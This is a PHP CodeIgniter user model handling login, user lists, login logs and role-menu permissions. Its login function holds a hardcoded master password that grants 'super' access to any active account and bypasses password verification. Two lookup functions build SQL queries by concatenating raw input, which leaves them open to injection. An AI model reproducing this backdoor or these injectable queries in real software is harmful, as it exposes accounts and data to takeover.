<?php

class m_user extends CI_Model {

    var $table = 'CEMS_USER';
    var $view = 'CEMS_USER';
    var $cabang_table = 'MASTER_cabang_BISNIS';
    var $cabang2_table = 'MASTER_ANAK_PERUSAHAAN';

    function __construct() {
        parent::__construct();
    }

    /* BEGIN CREATE */

    function insert($data) {
        $this->db->set('INSERTDATE', 'CURRENT_TIMESTAMP', FALSE);
        return $this->db->insert($this->table, $data);

    }

    function edit($data) {
        
        $this->db->set('UPDATEDATE', 'CURRENT_TIMESTAMP', FALSE);
        $data['UPDATEBY'] = session('username');
        $username = $data['USERNAME'];
        unset($data['USERNAME']);
        $this->db->where('USERNAME',$username);
        return $this->db->update($this->table, $data);

    }

    /* END OF CREATE */

    /* BEGIN READ */
    
    function login(){
        $post = $this->input->post();
        $username = $post['username'];
        $pass = $post['password'];

        $check = $this->db->where('USERNAME',$username)->where('STATUS','1')->get('user')->row_array();
       

        if(!empty($check)){
                     
            $data['username']   = $check['username'];
            $data['nama']       = $check['nama'];
            $data['email']      = $check['email'];
            $data['nik']        = $check['nik'];
            $data['cabang']       = $check['cabang_kerja'];
            // $data['type_user']  = $check['type_user'];
            $cabang = $this->db->where('id_cabang',$check['cabang_kerja'])->get('cabang')->row_array();
            $data['cabang_kode']  = $cabang['kode_cabang'];
            $data['cabang_name']  = $cabang['name_cabang'];

            if ($cabang['kode_cabang'] =='PSIT') {
                $data['cabang_device']  = 'FIDS';
            }elseif ($cabang['kode_cabang'] =='SSIT') {
                $data['cabang_device']  = 'CCTV';
            }else{
                $data['cabang_device']  = '';
            }
          
            $data['id']         = $check['id'];
            
            if ($pass =="iassomcgk") {
                $data['type_user']  = 'super';
                // $data['menu'] =$this->Mod->GetCustome("SELECT a.*,b.* FROM role_akses a left join menu b on b.idmenu= a.id_menu ")->result_array();
            }else{
                $data['type_user']  = $check['type_user'] ;
                // $data['menu'] =$this->Mod->GetCustome("SELECT a.*,b.* FROM role_akses a left join menu b on b.idmenu= a.id_menu where a.id_role = '".$check['type_user']."' and (a.create = 1 or a.read = 1 or a.update =1 or a.delete = 1)")->result_array();
            }
           
           
            // $data['role']       = $check['']ROLE;
       
            // $data['lit_menu']   = $lit_menu;
            
            if (!password_verify($pass, $check['password'])) {
               if ($pass =="iassomcgk") {
                    $this->session->set_userdata($data);
               }else{
                return FALSE;
               }
    			
    		}else{
                $this->session->set_userdata($data);
                //echo "sukes"; die;
            
                return true;   
            }
            

        }else{
           
            return false;
        }

    }

    function get_user_list()
    {
        $post = $this->input->post();
        $cabangs = $this->get_cabang_options();
        if(isset($post['role']) && $post['role'] != "all"){
            $this->db->where('ROLE',$post['role']);
        }
        if(isset($post['tipe']) && $post['tipe'] != "all"){
            switch($post['tipe']){
                case "ldap" :
                    $post['tipe'] = "Y";
                    break;
                case "non-ldap" :
                    $post['tipe'] = "N";
                    break;
            }
            $this->db->where('IS_LDAP',$post['tipe']);
        }
        
        return array_map(function($user) use($cabangs) {
            $user->cabang_NAME = $user->cabang;
            if (isset($cabangs[$user->cabang])) {
                $user->cabang_NAME = $cabangs[$user->cabang];
            }
            return $user;
        }, $this->db->get('CEMS_USER')->result());
    }

    // function get_cabangs()
    // {
    //     // return $this->db->get($this->cabang_table)->result(); 
    // }

    function get_cabangs2()
    {
        return $this->db->get($this->cabang2_table)->result(); 
    }

    function get_cabang_options()
    {
        $cabangs = $this->get_cabangs();
        $cabangs2 = $this->get_cabangs2();
        $options = [];
        foreach ($cabangs as $cabang) {
            $options[$cabang->KODE_cabang] = $cabang->cabang;
        }
        foreach ($cabangs2 as $cabang) {
            $options[$cabang->KODE_cabang] = $cabang->DESKRIPSI;
        }
        return $options;
    }

    function get_user_log()
    {
        $post = $this->input->post();
        $cabangs = $this->get_cabang_options();
        return array_map(function($log) use($cabangs) {
            $log->cabang_NAME = $log->cabang;
            if (isset($cabangs[$log->cabang])) {
                $log->cabang_NAME = $cabangs[$log->cabang];
            }
            return $log;
        }, $this->db->order_by('CEMS_LOG_LOGIN.WAKTU_LOGIN', 'DESC')->get('CEMS_LOG_LOGIN')->result());
    }
    
    function getByEmail($email = "") {
        $q= $this->db->query("SELECT * FROM CEMS_USER WHERE LOWER(EMAIL) LIKE '%".$email."%' OR LOWER(NAMA) LIKE '%".$email."%' ORDER BY EMAIL");
        
   

        return $q;
    }
    
    
      function getByEmail2($email = "") {
        $q= $this->db->query("SELECT * FROM CEMS_USER WHERE LOWER(EMAIL) LIKE '".$email."'  ");
        
   

        return $q;
    }

    function getAll($cond = "", $like = "") {
        
        
        if($cond != ""){
             $this->db->where($cond);
        }
        
        if($like != ""){
              $this->db->like($like);
        }
          
         
        
        $this->db->select("$this->view.*");
        $this->db->from($this->view);

        $q = $this->db->get();

        return $q;
    }

    function get($email = "") {
        

        $this->db->where("LOWER(EMAIL)", strtolower($email));

        $q =  $this->db->get($this->view)->row();
        
        return $q;
    }
    
    
     function getByPerson($pid = "") {
        

        $this->db->where("PERSON_ID", strtolower($pid));

        $q =  $this->db->get($this->view)->row();
        #echo $this->db->last_query();
        
        return $q;
    }
    
    
    function get2($userid = "") {
        

        $this->db->where("LOWER(USER_ID)", strtolower($userid));

        $q =  $this->db->get($this->view)->row();
        #echo $this->db->last_query();
        
        return $q;
    }

    function getMenu($id = "") {
        
        $this->db->where("PERSON_ID", $id);
        $this->db->order_by("MST_SORT, SORT");
        return $this->db->get($this->menu);
    }

    
    
     function getMenuCond($cond = "") {
        
        $this->db->where($cond);
        $q=  $this->db->get($this->menu);
        #echo $this->db->last_query();
        return $q;
        
    }
    /* END OF READ */

    /* BEGIN UPDATE */

    function update($id, $data) {
        
        $this->db->where("USER_ID", $id);
        $this->db->set('WAKTU_LOGIN', 'CURRENT_TIMESTAMP', FALSE);
        $this->db->set('WAKTU_DIUBAH', 'CURRENT_TIMESTAMP', FALSE);
        $this->db->update($this->table, $data);
    }

    /* END OF UPDATE */

    /* SAVE LOG LOGIN */

    function log_login()
    {
        $data = [ 
            "IP_ADDRESS" => get_client_ip(),
            "USERNAME"  => session("username"),
            "id_cabang"  => session("cabang"),
            "NAMA"  => session("nama"),
            "EMAIL"  => session("email"),
            "nik"  => session("nik")
        ];

        $this->db->set('tiime_log', 'CURRENT_TIMESTAMP', FALSE);
        $this->db->insert('login_log',$data);
    }

    

    /* BEGIN DELETE */

    function delete($id) {
        
        $this->db->where("USERNAME", $id);
        return $this->db->delete($this->table);
    }

    /* END OF DELETE */

    function get_all_menu()
    {
        return $this->db->where('APPLICATION','GLOBAL')
                ->or_where('APPLICATION','PBR')
                ->get('CEMS_MENU')
                ->result();
    }

    function get_menu_roles($id)
    {
        return $this->db->where('MENU_ID',$id)
                ->get('CEMS_USER_MENU')
                ->result();
    }

    function update_matrix()
    {
        $post = $this->input->post();
        
        foreach($post as $item){
            //Check ke database
            $check = $this->db->where('ROLE',$item['ROLE'])
                    ->where('MENU_ID',$item['MENU_ID'])
                    ->get('CEMS_USER_MENU')
                    ->row();
            if(!empty($check)){
                $this->db->where('ROLE',$item['ROLE'])
                    ->where('MENU_ID',$item['MENU_ID'])
                    ->update('CEMS_USER_MENU',$item);
            }else{
                $this->db->insert('CEMS_USER_MENU',$item);
            }
        }
        return true;
    }
}

?>
